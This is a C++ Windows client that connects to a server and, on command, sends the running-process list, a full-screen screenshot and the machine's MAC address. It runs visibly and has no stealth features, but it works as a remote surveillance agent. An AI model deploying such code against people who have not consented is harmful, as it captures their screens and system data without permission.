#include <winsock2.h>   // WinAPI sockets
#include <ws2tcpip.h>   // Types references
#include <TlHelp32.h>   // Types references
#include <iphlpapi.h>   // MAC adress access
#include <iostream>
#include <string>
#include <vector>
#include <cstdint>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "iphlpapi.lib")


class Client {
// Client class
private:
    // Struct for Process information
    struct ProcInfo {
        std::string Name;
        DWORD pid;
    };

    SOCKET sock;
    std::string server_ip;
    int server_port;
    int ElapsingTime; // Waing message from Server period
    bool connected;
    
    bool initialize_winsock() {
        WSADATA wsa;
        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
            std::cerr << "WSAStartup failed: " << WSAGetLastError() << std::endl;
            return false;
        }
        return true;
    }
    
    void cleanup_winsock() {
        WSACleanup();
    }

    // Run through system and get all running process
    std::vector<ProcInfo> getRunningProcesses() {
        std::vector<ProcInfo> result;
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap == INVALID_HANDLE_VALUE) return result;

        PROCESSENTRY32W pe32; // PROCESSENTRY32W (Unicode)
        pe32.dwSize = sizeof(pe32);
        
        if (Process32FirstW(hSnap, &pe32)) {
            do {
                // WCHAR to UTF-8 string
                char exeName[MAX_PATH];
                WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, exeName, MAX_PATH, NULL, NULL);
                result.push_back({exeName, pe32.th32ProcessID});
            } while (Process32NextW(hSnap, &pe32));
        }
        
        CloseHandle(hSnap);
        return result;
    }
    
    // Builds JSON-like std::string from list of process
    std::string buildJSONprocs(const std::vector<ProcInfo>& list) {
        std::string result = "{ \"processes\": [";
        
        for (size_t i = 0; i < list.size(); ++i) {
            result += "{ \"exe\": \"" + list[i].Name + "\", \"pid\": " + std::to_string(list[i].pid) + " }";
            if (i != list.size() - 1) {
                result += ", ";
            }
        }
        
        result += "] }\n";
        return result;
    }

    std::string getMacAddress() {
        // Getting buffer size information
        ULONG bufferSize = 0;
        if (GetAdaptersInfo(NULL, &bufferSize) != ERROR_BUFFER_OVERFLOW) {
            return "ERROR";
        }
        
        // Malloc mem for adapter
        PIP_ADAPTER_INFO adapterInfo = (PIP_ADAPTER_INFO)malloc(bufferSize);
        if (adapterInfo == NULL) {
            return "ERROR";
        }
        
        // Getting information about adapter
        if (GetAdaptersInfo(adapterInfo, &bufferSize) != NO_ERROR) {
            free(adapterInfo);
            return "ERROR";
        }
        
        PIP_ADAPTER_INFO adapter = adapterInfo;
        std::string macAddress;
        
        // Get first active adapter
        while (adapter) {
            // WIFI/Ethernet
            if (adapter->Type == MIB_IF_TYPE_ETHERNET || adapter->Type == IF_TYPE_IEEE80211) {
                
                // "XX:XX:XX:XX:XX:XX" = 17 + \0
                char buffer[18];
                
                sprintf(buffer, "%02X:%02X:%02X:%02X:%02X:%02X",
                        adapter->Address[0],
                        adapter->Address[1],
                        adapter->Address[2],
                        adapter->Address[3],
                        adapter->Address[4],
                        adapter->Address[5]);
                
                macAddress = buffer;
                break;
            }
            
            adapter = adapter->Next;
        }
        
        free(adapterInfo);
        if (macAddress.empty()) {
            return "ERROR";
        }
        
        return macAddress;
    }

    std::vector<uint8_t> captureScreen(){
        int screenX = GetSystemMetrics(SM_XVIRTUALSCREEN);
        int screenY = GetSystemMetrics(SM_YVIRTUALSCREEN);
        int width   = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        int height  = GetSystemMetrics(SM_CYVIRTUALSCREEN);

        HDC hScreenDC = GetDC(NULL);
        HDC hMemDC = CreateCompatibleDC(hScreenDC);
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
        SelectObject(hMemDC, hBitmap);

        if (!BitBlt(hMemDC, 0, 0, width, height, hScreenDC, screenX, screenY, SRCCOPY|CAPTUREBLT)) {
            std::vector<uint8_t> buffer;
            DeleteObject(hBitmap);
            DeleteDC(hMemDC);
            ReleaseDC(NULL, hScreenDC);
            return buffer;
        }

        // BMP-headers
        BITMAP bmp;
        GetObjectW(hBitmap, sizeof(bmp), &bmp);
        BITMAPINFOHEADER bih = {};
        bih.biSize = sizeof(BITMAPINFOHEADER);
        bih.biWidth = width;
        bih.biHeight = height;
        bih.biPlanes = 1;
        bih.biBitCount = 32;
        bih.biCompression = BI_RGB;

        int rowBytes = ((bmp.bmWidth * 32 + 31) / 32) * 4;
        DWORD pixelDataSize = rowBytes * bmp.bmHeight;
        BITMAPFILEHEADER bfh = {};
        bfh.bfType = 0x4D42;
        bfh.bfOffBits = sizeof(bfh) + sizeof(bih);
        bfh.bfSize = bfh.bfOffBits + pixelDataSize;

        std::vector<uint8_t> buffer(bfh.bfSize);
        memcpy(buffer.data(), &bfh, sizeof(bfh));
        memcpy(buffer.data() + sizeof(bfh), &bih, sizeof(bih));

        if (!GetDIBits(hMemDC, hBitmap, 0, bmp.bmHeight, buffer.data() + bfh.bfOffBits, (BITMAPINFO*)&bih, DIB_RGB_COLORS)) {
            DeleteObject(hBitmap);
            DeleteDC(hMemDC);
            ReleaseDC(NULL, hScreenDC);
            buffer.clear();
            return buffer;
        }

        DeleteObject(hBitmap);
        DeleteDC(hMemDC);
        ReleaseDC(NULL, hScreenDC);

        return buffer;
    }

public:
    // Create client with Elapsing Time (socket waiting Time Out) = 30s default
    Client(const std::string& ip, int port, DWORD ElapsingTime = 3000) : sock(INVALID_SOCKET), server_ip(ip), server_port(port), connected(false), ElapsingTime(ElapsingTime) {
        initialize_winsock();
    }
    
    ~Client() {
        disconnect();
        cleanup_winsock();
    }
    
    // No copy
    Client(const Client&) = delete;
    Client& operator=(const Client&) = delete;
    
    // Connect to server
    bool connect_to_server() {
        // Creating socket
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            std::cerr << "Socket creation failed: " << WSAGetLastError() << std::endl;
            return false;
        }
        
        // Setting response waiting time and connecting to server
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&ElapsingTime, sizeof(ElapsingTime));
        sockaddr_in server_addr = {};
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(server_port);
        inet_pton(AF_INET, server_ip.c_str(), &server_addr.sin_addr);
        
        std::cout << "Connecting to " << server_ip << ":" << server_port << "..." << std::endl;
        
        if (connect(sock, (sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
            std::cerr << "Connection failed: " << WSAGetLastError() << std::endl;
            closesocket(sock);
            sock = INVALID_SOCKET;
            return false;
        }
        
        connected = true;
        std::cout << "Connected!" << std::endl;
        return true;
    }
    
    // Sending message to server
    bool send_message(const std::string& message) {
        if (!connected) return false;
        
        int sent = send(sock, message.c_str(), message.length(), 0);
        if (sent == SOCKET_ERROR) {
            std::cerr << "Sending failed: " << WSAGetLastError() << std::endl;
            return false;
        }
        
        return true;
    }
    
    // Sending Statistics about running process
    bool sendProcessStatistics() {
        if (!connected) return false;
        // Get all process
        std::vector<ProcInfo> procs = getRunningProcesses();

        // Combining JSON-like message
        std::string message = buildJSONprocs(procs);
        std::string message_info = "ProcessJSON, " + std::to_string(message.length());

        // Send to server
        if (!send_message(message_info) || !send_message(message)) return false;
        
        return true;
    }

    // Receiving messages from server with ElapsingTime
    bool receive_message(std::string& response, int& elapsed_ms) {
        if (!connected) return false;
        
        char buffer[4096];
        int received = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (received == SOCKET_ERROR) {
            // Validate socket waiting Time Out (ElapsingTime)
            int err = WSAGetLastError();
            if (err == WSAETIMEDOUT) {
                // Not getting messages from server over ElapsingTime
                elapsed_ms += int(ElapsingTime);
                return true;
            }
            std::cerr << "Receive failed: " << err << std::endl;
            connected = false;
            return false;
        }
        if (received == 0) {
            std::cout << "Connection closed by server" << std::endl;
            connected = false;
            return false;
        }
        buffer[received] = '\0';
        response.assign(buffer);
        // Zero waiting time
        elapsed_ms = 0;
        return true;
    }

    // Sending Screenshot to server
    bool sendScreenshot() {
        std::vector<uint8_t> screen = captureScreen();
        if (screen.empty()) return false;

        std::string screen_str = std::string(reinterpret_cast<const char *>(screen.data()), screen.size());
        std::string screen_str_info = "ScreenShot BMP, " + std::to_string(screen_str.length()) + "\n";
        if (!send_message(screen_str_info) || !send_message(screen_str)) return false;

        return true;
    }
    
    bool sendMACaddress() {
        std::string mac = getMacAddress();
        std::string mac_info = "MAC_ADDRESS, " + std::to_string(mac.length());
        if (mac.find("ERROR") != std::string::npos) return false;
        if (!send_message(mac_info) || !send_message(mac)) return false;
        
        return true;
    }

    // Compatiable commands from server
    bool ValidateCommand(const std::string& command) {
        std::string ProcessStatCommand = "SEND_STAT";
        std::string DeauthCommand = "DEAUTH_REQUEST";
        std::string ScreenShoot = "SEND_SCREEN";
        std::string MacCommand = "SEND_MAC";

        if (command.find(ProcessStatCommand) != std::string::npos) {
            if (!sendProcessStatistics()) {
                std::cout << "Can\'t send process statistic to server" << std::endl;
                return false;
            }
        }
        else if (command.find(ScreenShoot) != std::string::npos) {
            if (!sendScreenshot()) {
                std::cout << "Can\'t send screenshoot to server" << std::endl;
                return false;
            }
        }
        else if (command.find(MacCommand) != std::string::npos) {
            if (!sendMACaddress()) {
                std::cout << "can\'t send MAC adress to server" << std::endl;
                return false;
            }
        }
        else if (command.find(DeauthCommand) != std::string::npos) {
            disconnect();
        }

        else {
            std::cout << "Server message:\n" << command<< std::endl;
        }

        return true;
    }

    // Disconnecting
    void disconnect() {
        if (sock != INVALID_SOCKET) {
            closesocket(sock);
            sock = INVALID_SOCKET;
            connected = false;
            std::cout << "Disconnected!" << std::endl;
        }
    }

    bool is_connected() const {
        return connected;
    }

    // Client's sturtup function
    void start() {
        if (!connect_to_server()) return;
        
        int elapsed_ms = 0;
        std::string response;
        while (is_connected()){
            if (!receive_message(response, elapsed_ms)) {
                disconnect();
                break;
            }

            // If message from server was received
            if (!response.empty()) {
                if (!ValidateCommand(response)) {
                    std::cout << "Error handeling: " << response << std::endl;
                    disconnect();
                    break;
                }
                response.erase();
            }

            // If have been waiting for 10 minutes -- Disconnect
            if (elapsed_ms >= 600000) {  
                std::cout << "Not getting responses from server through wiating time. Disconnect..." << std::endl;
                disconnect();
                break;
            }
        }
    }
};

int main(int argc, char* argv[]) {
    SetConsoleOutputCP(CP_UTF8);
    std::string server_ip;
    int server_port;
    DWORD ElapsingTime;

    if (argc == 1) {
        server_ip = "127.0.0.1";
        server_port = 8888;
        ElapsingTime = 30000;
    }
    else {
        std::vector <std::string> args;
        for (int i = 0; i < argc; ++i) args.emplace_back(argv[i]);
        
        server_ip = args[1];
        server_port = std::stoi(args[2]);
        ElapsingTime = argc == 4 ? std::stoi(args[3]) : 30000;
    }
    
    Client client(server_ip, server_port, ElapsingTime);
    client.start();

    return 0;
}